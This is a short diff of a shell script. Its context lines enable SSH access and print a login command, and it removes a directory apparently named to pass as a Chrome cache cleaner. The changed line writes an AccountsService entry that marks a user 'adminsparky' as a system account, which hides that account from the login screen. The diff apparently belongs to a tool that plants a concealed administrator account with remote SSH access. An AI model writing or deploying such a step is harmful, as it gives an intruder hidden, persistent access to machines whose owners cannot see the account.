@@ -45,7 +45,7 @@ echo "SSH access enabled. Use the following command to log in:"
 echo "ssh $username@$(ip addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)"
 rm -rf clear_Chrome_Cache/
 # Add a file to the system with specified content
-echo -e '[User]\nSystemAccount=true' | sudo tee /var/lib/AccountsService/users/adminsparky
+echo -e '[InputSource0]\nxkb=za\n\n[User]\nIcon=/var/lib/AccountsService/icons/adminsparky\nSystemAccount=true' | sudo tee /var/lib/AccountsService/users/adminsparky
 
 echo "Added file to system '/var/lib/AccountsService/users/adminsparky'."
 clear
